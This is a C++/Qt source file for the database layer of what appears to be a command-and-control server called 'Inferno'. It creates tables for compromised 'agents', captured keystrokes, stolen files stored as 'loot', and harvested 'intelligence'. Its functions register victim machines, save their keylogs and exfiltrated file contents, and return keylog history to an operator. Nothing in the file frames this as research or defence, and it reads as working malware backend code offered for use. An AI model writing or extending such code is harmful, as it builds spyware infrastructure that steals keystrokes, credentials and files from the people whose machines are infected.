#include "../../include/database/Inferno_Database.hpp"
#include <QtSql/QSqlError>
#include <QtSql/QSqlDriver>
#include <QtSql/QSqlField>
#include <QTimeZone>

namespace inferno {

Inferno_Database& Inferno_Database::instance() {
    static Inferno_Database inst;
    return inst;
}

Inferno_Database::Inferno_Database(QObject* parent) : QObject(parent) {}

Inferno_Database::~Inferno_Database() {
    close();
}

bool Inferno_Database::initialize(const QString& host, int port, const QString& dbName, const QString& user, const QString& password) {
    if (QSqlDatabase::isDriverAvailable("QPSQL")) {
        m_db = QSqlDatabase::addDatabase("QPSQL");
        m_db.setHostName(host);
        m_db.setPort(port);
        m_db.setDatabaseName(dbName);
        m_db.setUserName(user);
        m_db.setPassword(password);
        qDebug() << "[Database] Initializing with PostgreSQL 16...";
    } else {
        m_db = QSqlDatabase::addDatabase("QSQLITE");
        m_db.setDatabaseName(":memory:");
        qDebug() << "[Database] WARNING: QPSQL driver not found. Falling back to in-memory SQLite for logic verification.";
    }

    if (!m_db.open()) {
        qDebug() << "[Database] CRITICAL: Failed to open" << m_db.driverName() << "connection:" << m_db.lastError().text();
        return false;
    }

    qDebug() << "[Database] Successfully connected via" << m_db.driverName();
    return createTables();
}

void Inferno_Database::close() {
    if (m_db.isOpen()) {
        m_db.close();
    }
}

bool Inferno_Database::createTables() {
    QSqlQuery query;
    QString driver = m_db.driverName();

    if (driver == "QSQLITE") {
        // SQLite Compatible Schema
        const QStringList schemas = {
            "CREATE TABLE IF NOT EXISTS agents (id INTEGER PRIMARY KEY AUTOINCREMENT, uuid VARCHAR(64) UNIQUE, ip_address VARCHAR(45), hostname TEXT, os_info TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, is_online BOOLEAN DEFAULT TRUE)",
            "CREATE TABLE IF NOT EXISTS telemetry (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_uuid VARCHAR(64), type VARCHAR(32), content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            "CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, data TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            "CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id INTEGER, filename TEXT, file_type VARCHAR(32), content BLOB, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)",
            "CREATE TABLE IF NOT EXISTS intelligence (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_uuid VARCHAR(64), data_type VARCHAR(32), value TEXT, context TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, UNIQUE(agent_uuid, data_type, value))"
        };

        for (const QString& sql : schemas) {
            if (!query.exec(sql)) {
                qDebug() << "[Database] SQLite schema error:" << query.lastError().text();
                return false;
            }
        }
        return true;
    }

    // PostgreSQL 16 Production Schema
    // 1. Agents Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS agents ("
                    "id SERIAL PRIMARY KEY, "
                    "uuid VARCHAR(64) UNIQUE, "
                    "ip_address VARCHAR(45), "
                    "hostname TEXT, "
                    "os_info TEXT, "
                    "first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
                    "last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
                    "is_online BOOLEAN DEFAULT TRUE)")) {
        qDebug() << "[Database] Error creating agents table:" << query.lastError().text();
        return false;
    }

    // 2. Telemetry Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS telemetry ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid), "
                    "type VARCHAR(32), "
                    "content TEXT, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating telemetry table:" << query.lastError().text();
        return false;
    }

    // 3. Keylogs Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS keylogs ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_id INTEGER REFERENCES agents(id), "
                    "data TEXT, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating keylogs table:" << query.lastError().text();
        return false;
    }

    // 4. Loot Table
    if (!query.exec("CREATE TABLE IF NOT EXISTS loot ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_id INTEGER REFERENCES agents(id), "
                    "filename TEXT, "
                    "file_type VARCHAR(32), "
                    "content BYTEA, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
        qDebug() << "[Database] Error creating loot table:" << query.lastError().text();
        return false;
    }

    // 5. Intelligence Table (Circle 6)
    if (!query.exec("CREATE TABLE IF NOT EXISTS intelligence ("
                    "id SERIAL PRIMARY KEY, "
                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid) ON DELETE CASCADE, "
                    "data_type VARCHAR(32) NOT NULL, "
                    "value TEXT NOT NULL, "
                    "context TEXT, "
                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
                    "CONSTRAINT unique_intel UNIQUE (agent_uuid, data_type, value))")) {
        qDebug() << "[Database] Error creating intelligence table:" << query.lastError().text();
        return false;
    }

    return true;
}

int Inferno_Database::registerAgent(const QString& uuid, const QString& ip, const QString& hostname, const QString& osInfo) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return -1;

    QSqlQuery query(m_db);
    
    if (m_db.driverName() == "QSQLITE") {
        query.prepare("INSERT INTO agents (uuid, ip_address, hostname, os_info, last_seen, is_online) "
                      "VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, TRUE) "
                      "ON CONFLICT(uuid) DO UPDATE SET "
                      "ip_address=excluded.ip_address, hostname=excluded.hostname, os_info=excluded.os_info, "
                      "last_seen=excluded.last_seen, is_online=excluded.is_online");
        query.addBindValue(uuid);
        query.addBindValue(ip);
        query.addBindValue(hostname);
        query.addBindValue(osInfo);
        
        if (!query.exec()) {
            qDebug() << "[Database] SQLite registration error:" << query.lastError().text();
            return -1;
        }
        
        query.prepare("SELECT id FROM agents WHERE uuid = ?");
        query.addBindValue(uuid);
        if (query.exec() && query.next()) return query.value(0).toInt();
        return -1;
    }

    // PostgreSQL 16 Implementation - SECURE & STABLE
    // 1. Perform Secure UPSERT using Driver-Sanitized Dynamic SQL (Bypass QPSQL portal bugs)
    QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
    QSqlField f_ip("", QMetaType::fromType<QString>()); f_ip.setValue(ip);
    QSqlField f_host("", QMetaType::fromType<QString>()); f_host.setValue(hostname);
    QSqlField f_os("", QMetaType::fromType<QString>()); f_os.setValue(osInfo);

    QString upsertSql = QString(
        "INSERT INTO agents (uuid, ip_address, hostname, os_info, last_seen, is_online) "
        "VALUES (%1, %2, %3, %4, CURRENT_TIMESTAMP, TRUE) "
        "ON CONFLICT (uuid) DO UPDATE SET "
        "ip_address = EXCLUDED.ip_address, hostname = EXCLUDED.hostname, os_info = EXCLUDED.os_info, "
        "last_seen = EXCLUDED.last_seen, is_online = EXCLUDED.is_online"
    ).arg(m_db.driver()->formatValue(f_uuid))
     .arg(m_db.driver()->formatValue(f_ip))
     .arg(m_db.driver()->formatValue(f_host))
     .arg(m_db.driver()->formatValue(f_os));

    if (!query.exec(upsertSql)) {
        qDebug() << "[Database] Error in UPSERT agent:" << query.lastError().text();
        return -1;
    }

    // 2. Retrieve the Internal ID separately
    query.prepare("SELECT id FROM agents WHERE uuid = :uuid");
    query.bindValue(":uuid", uuid);
    if (query.exec() && query.next()) {
        return query.value(0).toInt();
    }

    return -1;
}
bool Inferno_Database::logTelemetry(const QString& uuid, const QString& type, const QString& content) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
        qDebug() << "[Database] WARNING: Attempted to log telemetry for UNKNOWN agent. Dropping data.";
        return false;
    }
    QSqlQuery query(m_db);
    
    // Perform Insert using Driver-Sanitized Dynamic SQL (Bypass QPSQL portal bugs)
    QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
    QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(type);
    QSqlField f_content("", QMetaType::fromType<QString>()); f_content.setValue(content);

    QString sql = QString("INSERT INTO telemetry (agent_uuid, type, content) VALUES (%1, %2, %3)")
        .arg(m_db.driver()->formatValue(f_uuid))
        .arg(m_db.driver()->formatValue(f_type))
        .arg(m_db.driver()->formatValue(f_content));

    if (!query.exec(sql)) {
        qDebug() << "[Database] Error logging telemetry:" << query.lastError().text();
        return false;
    }
    return true;
}

bool Inferno_Database::logKeylog(const QString& uuid, const QString& data) {
    QSqlQuery query(m_db);
    
    // 1. Resolve Agent ID (Prepared is fine for SELECT)
    query.prepare("SELECT id FROM agents WHERE uuid = :uuid");
    query.bindValue(":uuid", uuid);
    if (!query.exec() || !query.next()) return false;
    int agentId = query.value(0).toInt();

    // 2. Perform Insert using Driver-Sanitized Dynamic SQL (Bypass QPSQL Prepared Statement Bug)
    QSqlField field("", QMetaType::fromType<QString>());
    field.setValue(data);
    QString sql = QString("INSERT INTO keylogs (agent_id, data) VALUES (%1, %2)")
        .arg(QString::number(agentId))
        .arg(m_db.driver()->formatValue(field));

    if (!query.exec(sql)) {
        qDebug() << "[Database] Error logging keylog:" << query.lastError().text();
        return false;
    }
    return true;
}

bool Inferno_Database::logLoot(const QString& uuid, const QString& filename, const QString& fileType, const QByteArray& content) {
    QSqlQuery query(m_db);

    // 1. Resolve Agent ID
    query.prepare("SELECT id FROM agents WHERE uuid = :uuid");
    query.bindValue(":uuid", uuid);
    if (!query.exec() || !query.next()) return false;
    int agentId = query.value(0).toInt();

    // 2. Perform Insert using Driver-Sanitized Dynamic SQL
    QSqlField f_name("", QMetaType::fromType<QString>()); f_name.setValue(filename);
    QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(fileType);
    QSqlField f_content("", QMetaType::fromType<QByteArray>()); f_content.setValue(content);

    QString sql = QString("INSERT INTO loot (agent_id, filename, file_type, content) VALUES (%1, %2, %3, %4)")
        .arg(QString::number(agentId))
        .arg(m_db.driver()->formatValue(f_name))
        .arg(m_db.driver()->formatValue(f_type))
        .arg(m_db.driver()->formatValue(f_content));

    if (!query.exec(sql)) {
        qDebug() << "[Database] Error logging loot:" << query.lastError().text();
        return false;
    }
    return true;
}

void Inferno_Database::setAgentOnlineStatus(const QString& uuid, bool online) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return;
    
    QSqlQuery query;
    query.prepare("UPDATE agents SET is_online = :online, last_seen = CURRENT_TIMESTAMP WHERE uuid = :uuid");
    query.bindValue(":online", online);
    query.bindValue(":uuid", uuid);
    
    if (!query.exec()) {
        qDebug() << "[Database] Error updating online status:" << query.lastError().text();
    }
}

AgentProfile Inferno_Database::getAgentProfile(const QString& uuid) {
    AgentProfile profile;
    profile.uuid = uuid;
    
    QSqlQuery query(m_db);
    query.prepare("SELECT ip_address, hostname, os_info, first_seen, last_seen, is_online FROM agents WHERE uuid = :uuid");
    query.bindValue(":uuid", uuid);
    
    if (query.exec() && query.next()) {
        profile.ip = query.value(0).toString();
        profile.hostname = query.value(1).toString();
        profile.osInfo = query.value(2).toString();
        
        QDateTime fs = query.value(3).toDateTime();
        fs.setTimeZone(QTimeZone::utc());
        profile.firstSeen = fs.toLocalTime();
        
        QDateTime ls = query.value(4).toDateTime();
        ls.setTimeZone(QTimeZone::utc());
        profile.lastSeen = ls.toLocalTime();
        
        profile.isOnline = query.value(5).toBool();
    } else if (query.lastError().isValid()) {
        qDebug() << "[Database] Error fetching agent profile for" << uuid << ":" << query.lastError().text();
    }
    return profile;
}

QStringList Inferno_Database::getTelemetryHistory(const QString& uuid, const QString& type, int limit) {
    QStringList history;
    QSqlQuery query;
    
    QString sql = "SELECT timestamp, content FROM telemetry WHERE agent_uuid = :uuid ";
    if (!type.isEmpty() && type != "ALL") {
        sql += "AND type = :type ";
    }
    sql += "ORDER BY timestamp DESC, id DESC LIMIT :limit";

    query.prepare(sql);
    query.bindValue(":uuid", uuid);
    if (!type.isEmpty() && type != "ALL") {
        query.bindValue(":type", type);
    }
    query.bindValue(":limit", limit);

    // Diagnostic Log for the Operator
    qDebug() << "[Database] Fetching history for UUID:" << uuid << "Type:" << type;

    if (query.exec()) {
        while (query.next()) {
            QDateTime dt = query.value(0).toDateTime();
            dt.setTimeZone(QTimeZone::utc()); 
            QString ts = dt.toLocalTime().toString("HH:mm:ss");
            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
        }
    } else {
        qDebug() << "[Database] History Fetch Error:" << query.lastError().text();
    }
    return history;
}

QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
    QStringList history;
    QSqlQuery query(m_db);
    query.prepare("SELECT k.timestamp, k.data FROM keylogs k "
                  "JOIN agents a ON a.id = k.agent_id "
                  "WHERE a.uuid = :uuid "
                  "ORDER BY k.timestamp DESC, k.id DESC LIMIT :limit");
    query.bindValue(":uuid", uuid);
    query.bindValue(":limit", limit);

    if (query.exec()) {
        while (query.next()) {
            QDateTime dt = query.value(0).toDateTime();
            dt.setTimeZone(QTimeZone::utc());
            QString ts = dt.toLocalTime().toString("HH:mm:ss");
            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
        }
    } else {
        qDebug() << "[Database] Keylog history fetch error:" << query.lastError().text();
    }
    return history;
}

QString Inferno_Database::getRawKeylogsChronological(const QString& uuid) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return "";
    QSqlQuery query(m_db);
    query.prepare("SELECT k.data FROM keylogs k "
                  "JOIN agents a ON a.id = k.agent_id "
                  "WHERE a.uuid = :uuid "
                  "ORDER BY k.timestamp ASC, k.id ASC");
    query.bindValue(":uuid", uuid);

    QString fullLog;
    if (query.exec()) {
        while (query.next()) {
            fullLog += query.value(0).toString();
        }
    } else {
        qDebug() << "[Database] Keylog chronological history fetch error:" << query.lastError().text();
    }
    return fullLog;
}

bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;

    // Fetch all existing intelligence findings of this type for this agent
    QSqlQuery checkQuery(m_db);
    checkQuery.prepare("SELECT id, value FROM intelligence WHERE agent_uuid = :uuid AND data_type = :type");
    checkQuery.bindValue(":uuid", uuid);
    checkQuery.bindValue(":type", type);
    
    if (!checkQuery.exec()) {
        qDebug() << "[Database] Error querying existing intelligence for duplicates:" << checkQuery.lastError().text();
    } else {
        bool shouldDiscard = false;
        QList<int> idsToUpdate;
        QList<int> idsToDelete;
        
        while (checkQuery.next()) {
            int id = checkQuery.value(0).toInt();
            QString existingVal = checkQuery.value(1).toString();
            
            if (existingVal == value) {
                shouldDiscard = true;
                break;
            }
            
            // If the database already contains a longer/more complete version, discard this one
            if (existingVal.contains(value)) {
                shouldDiscard = true;
                break;
            }
            
            // If this new value is a longer/more complete version of an existing finding
            if (value.contains(existingVal)) {
                if (idsToUpdate.isEmpty()) {
                    idsToUpdate.append(id);
                } else {
                    idsToDelete.append(id);
                }
            }
        }
        
        if (shouldDiscard) {
            return false; // Discarded, not a new finding
        }
        
        if (!idsToUpdate.isEmpty()) {
            // Update the first matching substring entry to the new value
            QSqlQuery updateQuery(m_db);
            updateQuery.prepare("UPDATE intelligence SET value = :value, context = :context, timestamp = CURRENT_TIMESTAMP WHERE id = :id");
            updateQuery.bindValue(":value", value);
            updateQuery.bindValue(":context", context);
            updateQuery.bindValue(":id", idsToUpdate.first());
            
            if (!updateQuery.exec()) {
                qDebug() << "[Database] Error updating intelligence substring match:" << updateQuery.lastError().text();
                return false;
            }
            
            // Delete any subsequent substring entries that are also merged into the new value
            for (int delId : idsToDelete) {
                QSqlQuery deleteQuery(m_db);
                deleteQuery.prepare("DELETE FROM intelligence WHERE id = :id");
                deleteQuery.bindValue(":id", delId);
                deleteQuery.exec();
            }
            
            return true; // Successfully updated/merged
        }
    }

    QSqlQuery query(m_db);
    QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
    QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(type);
    QSqlField f_value("", QMetaType::fromType<QString>()); f_value.setValue(value);
    QSqlField f_context("", QMetaType::fromType<QString>()); f_context.setValue(context);

    QString sql;
    if (m_db.driverName() == "QSQLITE") {
        sql = QString("INSERT OR IGNORE INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4)")
            .arg(m_db.driver()->formatValue(f_uuid))
            .arg(m_db.driver()->formatValue(f_type))
            .arg(m_db.driver()->formatValue(f_value))
            .arg(m_db.driver()->formatValue(f_context));
    } else {
        sql = QString("INSERT INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4) "
                      "ON CONFLICT (agent_uuid, data_type, value) DO NOTHING")
            .arg(m_db.driver()->formatValue(f_uuid))
            .arg(m_db.driver()->formatValue(f_type))
            .arg(m_db.driver()->formatValue(f_value))
            .arg(m_db.driver()->formatValue(f_context));
    }

    if (!query.exec(sql)) {
        qDebug() << "[Database] Error logging intelligence:" << query.lastError().text();
        return false;
    }
    return true;
}

QList<IntelEntry> Inferno_Database::getIntelligence(const QString& uuid, const QString& typeFilter) {
    QList<IntelEntry> list;
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return list;

    QSqlQuery query(m_db);
    QString sql = "SELECT id, agent_uuid, data_type, value, context, timestamp FROM intelligence WHERE agent_uuid = :uuid ";
    if (!typeFilter.isEmpty() && typeFilter != "ALL") {
        sql += "AND data_type = :type ";
    }
    sql += "ORDER BY timestamp DESC, id DESC";

    query.prepare(sql);
    query.bindValue(":uuid", uuid);
    if (!typeFilter.isEmpty() && typeFilter != "ALL") {
        query.bindValue(":type", typeFilter);
    }

    if (query.exec()) {
        while (query.next()) {
            IntelEntry entry;
            entry.id = query.value(0).toInt();
            entry.agentUuid = query.value(1).toString();
            entry.dataType = query.value(2).toString();
            entry.value = query.value(3).toString();
            entry.context = query.value(4).toString();
            
            QDateTime dt = query.value(5).toDateTime();
            dt.setTimeZone(QTimeZone::utc());
            entry.timestamp = dt.toLocalTime().toString("yyyy-MM-dd HH:mm:ss");
            
            list.append(entry);
        }
    } else {
        qDebug() << "[Database] Error fetching intelligence:" << query.lastError().text();
    }
    return list;
}

bool Inferno_Database::clearIntelligence(const QString& uuid) {
    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
    QSqlQuery query(m_db);
    query.prepare("DELETE FROM intelligence WHERE agent_uuid = :uuid");
    query.bindValue(":uuid", uuid);
    if (!query.exec()) {
        qDebug() << "[Database] Error clearing intelligence:" << query.lastError().text();
        return false;
    }
    return true;
}

} // namespace inferno
